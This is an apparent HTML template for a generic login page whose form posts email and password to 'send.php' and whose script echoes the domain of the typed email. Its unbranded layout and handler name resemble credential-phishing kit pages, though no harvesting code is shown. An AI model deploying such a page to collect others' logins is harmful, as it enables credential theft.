<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login Page</title>
    <style>
        body {
            background: #f2f2f2;
            font-family: Arial, sans-serif;
        }
        .login-container {
            width: 350px;
            margin: 100px auto;
            background: #fff;
            padding: 30px 40px 40px 40px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .login-container h2 {
            text-align: center;
            margin-bottom: 24px;
            color: #333;
        }
        .login-container label {
            display: block;
            margin-bottom: 8px;
            color: #555;
        }
        .login-container input[type="email"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 18px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 15px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background: #4285f4;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        .login-container button:hover {
            background: #357ae8;
        }
        .email-domain {
            margin-top: 8px;
            font-size: 13px;
            color: #888;
        }
        .contact-link {
            display: block;
            text-align: center;
            margin-top: 18px;
            color: #4285f4;
            text-decoration: none;
            font-size: 14px;
        }
        .contact-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form action="send.php" method="POST" autocomplete="off">
            <label for="email">Email</label>
            <input type="email" id="email" name="email" required>
            <div class="email-domain" id="emailDomain"></div>
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Login</button>
        </form>
        <a class="contact-link" href="mailto:your@email.com">Contact Support</a>
    </div>
    <script>
        const emailInput = document.getElementById('email');
        const emailDomainDiv = document.getElementById('emailDomain');
        emailInput.addEventListener('input', function() {
            const value = emailInput.value;
            const atIndex = value.indexOf('@');
            if (atIndex !== -1) {
                const domain = value.slice(atIndex + 1);
                emailDomainDiv.textContent = domain ? `Domain: ${domain}` : '';
            } else {
                emailDomainDiv.textContent = '';
            }
        });
    </script>
</body>
</html>
